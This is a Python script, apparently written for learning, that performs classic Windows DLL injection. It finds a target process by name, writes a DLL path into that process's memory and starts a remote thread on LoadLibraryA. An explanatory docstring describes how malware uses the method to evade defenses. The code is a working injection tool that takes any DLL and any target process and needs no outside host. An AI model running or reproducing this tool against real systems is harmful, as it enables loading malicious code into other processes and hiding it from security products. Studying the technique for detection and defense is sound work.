# Simple script to learn about DLL injection
# *Unfinished...
# by Drewski1313
#############################################

import ctypes
from ctypes import wintypes as w
import os

'''
1. CLASSIC DLL INJECTION VIA CREATEREMOTETHREAD AND LOADLIBRARY 
This technique is one of the most common 
techniques used to inject malware into another process. The malware writes the path to its malicious dynamic-link 
library (DLL) in the virtual address space of another process, and ensures the remote process loads it by creating a 
remote thread in the target process. 

The malware first needs to target a process for injection (e.g. svchost.exe). This is usually done by searching 
through processes by calling a trio of Application Program Interfaces (APIs): CreateToolhelp32Snapshot, 
Process32First, and Process32Next. CreateToolhelp32Snapshot is an API used for enumerating heap or module states of a 
specified process or all processes, and it returns a snapshot. Process32First retrieves information about the first 
process in the snapshot, and then Process32Next is used in a loop to iterate through them. After finding the target 
process, the malware gets the handle of the target process by calling OpenProcess. 

As shown in Figure 1, the malware calls VirtualAllocEx to have a space to write the path to its DLL. The malware then 
calls WriteProcessMemory to write the path in the allocated memory. Finally, to have the code executed in another 
process, the malware calls APIs such as CreateRemoteThread, NtCreateThreadEx, or RtlCreateUserThread. The latter two 
are undocumented. However, the general idea is to pass the address of LoadLibrary to one of these APIs so that a 
remote process has to execute the DLL on behalf of the malware. 

CreateRemoteThread is tracked and flagged by many security products. Further, it requires a malicious DLL on disk 
which could be detected. Considering that attackers are most commonly injecting code to evade defenses, sophisticated 
attackers probably will not use this approach. The screenshot below displays a malware named Rebhip performing this 
technique. 
REFERENCE: https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process
'''

# GLOBALs DLLs for CreateToolhelp32Snapshot, Process32First, and Process32Next. Also for OpenProcess, VirtualAllocEx,
# WriteProcessMemory, CreateRemoteThread
h_kernel32 = ctypes.WinDLL("Kernel32.dll")
MAX_PATH = w.MAX_PATH
# for OpenProcess()
PROCESS_ALL_ACCESS = (0x00F000 | 0x00100000 | 0xFFF)

'''
typedef struct tagPROCESSENTRY32 {
  DWORD     dwSize;  # The size of the structure, in bytes. Before calling the Process32First function, set this member 
                        to sizeof(PROCESSENTRY32). If you do not initialize dwSize, Process32First fails.
  DWORD     cntUsage;
  DWORD     th32ProcessID;
  ULONG_PTR th32DefaultHeapID;
  DWORD     th32ModuleID;
  DWORD     cntThreads;
  DWORD     th32ParentProcessID;
  LONG      pcPriClassBase;
  DWORD     dwFlags;
  CHAR      szExeFile[MAX_PATH];
} PROCESSENTRY32;
'''


class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [
        ("dwSize", w.DWORD),  # The calling application must set the dwSize member of PROCESSENTRY32 to the size,
        # in bytes, of the structure.
        ("cntUsage", w.DWORD),  # This member is no longer used and is always set to zero.
        ("th32ProcessID", w.DWORD),
        ("th32DefaultHeapID", w.PULONG),  # This member is no longer used and is always set to zero.
        ("th32ModuleID", w.DWORD),  # This member is no longer used and is always set to zero.
        ("cntThreads", w.DWORD),
        ("th32ParentProcessID", w.DWORD),
        ("pcPriClassBase", w.LONG),
        ("dwFlags", w.DWORD),  # This member is no longer used and is always set to zero.
        ("szExeFile", w.CHAR * MAX_PATH)  # char * MAX_PATH for wanted size of char[] (260)
    ]


# FUNCs
def create_toolhelp32_snapshot() -> w.HANDLE:
    '''
    HANDLE CreateToolhelp32Snapshot(
    [in] DWORD dwFlags,  # TH32CS_SNAPPROCESS, 0x00000002, Includes all processes in the system in the snapshot. To
                            enumerate the processes, see Process32First.
    [in] DWORD th32ProcessID  # ignored for my purposes of returning all processes
    );
    If the function succeeds, it returns an open handle to the specified snapshot.
    If the function fails, it returns INVALID_HANDLE_VALUE. To get extended error information, call GetLastError.
    Possible error codes include ERROR_BAD_LENGTH.
    [*] DLL	Kernel32.dll
    '''
    print("[+] Creating the Toolhelp32 Snapshot")
    dwFlags = 0x00000002
    th32ProcessID = None
    h_resp = h_kernel32.CreateToolhelp32Snapshot(dwFlags, th32ProcessID)
    if h_resp < 0:
        find_last_error("create_toolhelp32_snapshot")
    return h_resp


def process32_first(p_handle: w.HANDLE) -> PROCESSENTRY32:
    '''
    BOOL Process32First(
    [in]      HANDLE           hSnapshot,
    [in, out] LPPROCESSENTRY32 lppe  # A pointer to a PROCESSENTRY32 structure
    );
    Returns TRUE if the first entry of the process list has been copied to the buffer or FALSE otherwise. The
    ERROR_NO_MORE_FILES error value is returned by the GetLastError function if no processes exist or the snapshot
    does not contain process information.
    DLL	Kernel32.dll
    '''
    print(f"[+] Retrieving the first Process with HANDLE: {p_handle}")
    hSnapshot = p_handle
    # initialize and fill out the PROCESSENTRY32 Structure required to pass and receive each processes' information
    LPPROCESSENTRY32 = PROCESSENTRY32()
    # LPPROCESSENTRY32.szExeFile = MAX_PATH
    LPPROCESSENTRY32.dwSize = ctypes.sizeof(LPPROCESSENTRY32)
    bool_resp = h_kernel32.Process32First(hSnapshot, ctypes.byref(LPPROCESSENTRY32))
    if not bool_resp:
        find_last_error("process32_first")
    return LPPROCESSENTRY32


def process32_next(process_entry32: PROCESSENTRY32, h_processes: w.HANDLE) -> bool:
    '''
    BOOL Process32Next(
    [in]  HANDLE           hSnapshot,
    [out] LPPROCESSENTRY32 lppe
    );
    Returns TRUE if the next entry of the process list has been copied to the buffer or FALSE otherwise. The
    ERROR_NO_MORE_FILES error value is returned by the GetLastError function if no processes exist or the snapshot
    does not contain process information.
    DLL	Kernel32.dll
    '''
    hSnapshot = h_processes
    LPPROCESSENTRY32 = process_entry32
    bool_resp = h_kernel32.Process32Next(hSnapshot, ctypes.byref(LPPROCESSENTRY32))
    if not bool_resp:
        find_last_error("process32_first")
    return bool_resp


# function to return the last error if needed when looking at WinAPI return values
def find_last_error(func_name: str):
    error = h_kernel32.GetLastError()
    if error != 0:
        print(f"{func_name} had an error. Error Code: {error}")
        exit(1)
    else:
        print(f"[+] Last Error check from {func_name} found no ERRORs!")


def get_handle_to_open_process_by_pid(proc_id: int) -> int:
    print(f"[+] Getting handle to process with pid {proc_id}")
    # global var created
    dwDesiredAccess = PROCESS_ALL_ACCESS
    bInheritHandle = False
    # convert decimal to hex string and then convert back to base 16 (hex) int
    dwProcessId = int(hex(proc_id), 16)
    response = h_kernel32.OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId)
    if response <= 0:
        find_last_error("get_handle_to_open_process")
    print(f"\t- handle was created: {response}, so now its time to INJECT it!")
    return response


def virtual_alloc_ex(h_process, dll_size):
    '''
    LPVOID VirtualAllocEx(
    [in]           HANDLE hProcess,
    [in, optional] LPVOID lpAddress,
    [in]           SIZE_T dwSize,
    [in]           DWORD  flAllocationType,
    [in]           DWORD  flProtect
    );
    If the function succeeds, the return value is the base address of the allocated region of pages.
    If the function fails, the return value is NULL. To get extended error information, call GetLastError.
    DLL	Kernel32.dll
    '''
    print("[+] Allocating memory in Remote Process before writing DLL to Remote Memory")
    hProcess = h_process
    lpAddress = None
    dwSize = w.DWORD(dll_size)
    flAllocationType = (
                0x1000 | 0x2000)  # (0x00001000 | 0x00002000)  # To reserve and commit pages in one step, call VirtualAllocEx with
    # MEM_COMMIT | MEM_RESERVE.
    flProtect = 0x04  # changed because i only need PAGE_READWRITE// 0x40 PAGE_EXECUTE_READWRITE 0x40, Enables execute, read-only, or read/write access to the
    # committed region of pages.
    b_address = h_kernel32.VirtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect)
    if b_address <= 0 or b_address is None:
        find_last_error("virtual_alloc_ex")
    print(f"\t - memory allocated successfully! Base Address in Remote Process to write to: {b_address}")
    return b_address


def write_process_memory(h_process, base_address, dll_path):
    '''
    BOOL WriteProcessMemory(
    [in]  HANDLE  hProcess,
    [in]  LPVOID  lpBaseAddress,
    [in]  LPCVOID lpBuffer,
    [in]  SIZE_T  nSize,
    [out] SIZE_T  *lpNumberOfBytesWritten
    );
    If the function succeeds, the return value is nonzero.
    If the function fails, the return value is 0 (zero).
    DLL	Kernel32.dll
    '''
    print(f"[+] Writing {dll_path} to Remote Process at base address: {base_address}")
    # creating a buffer for my base address
    # buf = ctypes.create_string_buffer(str(base_address).decode())
    hProcess = h_process
    lpBaseAddress = base_address
    # create the buffer of the string with built in ctypes, must first convert origianl string to bytes with bytes()
    lpBuffer = ctypes.create_string_buffer(bytes(dll_path, 'utf-8'))
    nSize = len(dll_path)
    lpNumberOfBytesWritten = None
    resp = h_kernel32.WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten)
    if resp == 0 or resp is None:
        find_last_error("write_process_memory()")
    return


def create_remote_thread(h_process, base_address, proc_name):
    '''
    HANDLE CreateRemoteThreadEx(
    [in]            HANDLE                       hProcess,
    [in, optional]  LPSECURITY_ATTRIBUTES        lpThreadAttributes, optional so setting to NULL for now
    [in]            SIZE_T                       dwStackSize,  # The initial size of the stack, in bytes. The system
                                                               # rounds this value to the nearest page. If this
                                                               # parameter is 0 (zero), the new thread uses the default
                                                               # size for the executable.
    [in]            LPTHREAD_START_ROUTINE       lpStartAddress,
    [in, optional]  LPVOID                       lpParameter,
    [in]            DWORD                        dwCreationFlags,
    [out, optional] LPDWORD                      lpThreadId
    );
    If the function succeeds, the return value is a handle to the new thread.
    If the function fails, the return value is NULL. To get extended error information, call GetLastError.
    DLL	Kernel32.dll
    '''
    print(f"[+] Starting a Remote Thread for LoadLibrary in {proc_name}")
    # Get LoadLibraryA's address in memory after getting the module handle to kernel32 with GetModuleHandleA
    # must turn the string of the DLL we want into bytes to then pass to ctypes.create_string_buffer() because
    # GetModuleHandleA() expects a LPCSTR (which is a string buff in ctypes)
    buffer_module_name = 'Kernel32.dll'.encode('utf-8')
    hKernel32 = h_kernel32.GetModuleHandleA(ctypes.create_string_buffer(buffer_module_name))
    if hKernel32 is None or hKernel32 == 0:
        find_last_error("GetModuleHandleA('Kernel32.dll')")
    # must turn the string of the DLL we want into bytes to then pass to ctypes.create_string_buffer() because
    # GetProcAddress() expects a LPCSTR (which is a string buff in ctypes)
    buffer_proc_name = "LoadLibraryA".encode('utf-8')
    hLoadLibraryA = h_kernel32.GetProcAddress(hKernel32, ctypes.create_string_buffer(buffer_proc_name))
    if hLoadLibraryA is None or hLoadLibraryA == 0:
        find_last_error("GetProcAddress(LoadLibrary)")
    print(f"[+] Successfully got Kernel32 Module and received Address to LoadLibraryA: {hLoadLibraryA} with GetProcAddress")
    hProcess = h_process
    lpThreadAttributes = None
    dwStackSize = 0
    lpStartAddress = hLoadLibraryA
    lpParameter = base_address
    dwCreationFlags = 0  # 0, The thread runs immediately after creation.
    lpAttributeList = None
    # buffer for return value of thread ID to verify it was actually created (not just rely on NO ERRORs)
    thread_id = ctypes.c_ulong(0)
    lpThreadId = thread_id
    # Create at thread at the address of LoadLibraryA in the external process,
    # Passing the address of the allocated memory as an argument.
    # The result is a tuple of the thread handle and thread ID.
    remoteData = h_kernel32.CreateRemoteThread(hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter,
                                               dwCreationFlags, ctypes.byref(lpThreadId))
    if remoteData == 0 or remoteData is None:
        find_last_error("create_remote_thread()")
    print(f"[+] Remote Thread with ID {lpThreadId.value} created!")
    return


def simple_dll_injection(dll_path, proc_to_inject):
    h_processes = create_toolhelp32_snapshot()
    print(f"\t - handle to processes created successfully: {h_processes}")
    LPPROCESSENTRY32 = process32_first(h_processes)
    first_proc = LPPROCESSENTRY32.szExeFile.decode('utf-8')
    first_proc = first_proc.replace("[", "").replace("]", "")
    print(f"\t - First Process received successfully, procname = {first_proc}")
    while True:
        process32_next(LPPROCESSENTRY32, h_processes)
        next_proc = LPPROCESSENTRY32.szExeFile.decode('utf-8')
        next_proc = next_proc.replace("[", "").replace("]", "")
        print(f"\t - Next Process received successfully, procname = {next_proc}")
        if next_proc.lower() == proc_to_inject.lower():
            print(f"[+] Found the process we want to inject! {next_proc} has a PID: {LPPROCESSENTRY32.th32ProcessID}")
            break
    # get a handle to the process that will be injected via it's PID found from Process32Next
    h_process = get_handle_to_open_process_by_pid(LPPROCESSENTRY32.th32ProcessID)
    # allocate memory in the remote process based on the size of the dll being injected, WinAPI rounds up for us
    dll_name_size = len(dll_path) + 20  # returns an int in bytes
    base_address = virtual_alloc_ex(h_process, dll_name_size)
    write_process_memory(h_process, base_address, dll_path)
    create_remote_thread(h_process, base_address, proc_to_inject)
    return


def get_size_of_file(filepath: str) -> int:
    return os.path.getsize(filepath)


# MAIN
def main():
    # get the path to the dll to inject
    dll_path = input("What DLL would you like to inject? NOTE: full path required.\n")
    proc_to_inject = input("What process would you like to inject into? NOTE: DEFAULT is Notepad.exe\n")
    if len(proc_to_inject) < 2:
        proc_to_inject = "Notepad.exe"
    print(f"[+] Injecting '{dll_path}' into '{proc_to_inject}'")
    simple_dll_injection(dll_path, proc_to_inject)


if __name__ == "__main__":
    main()
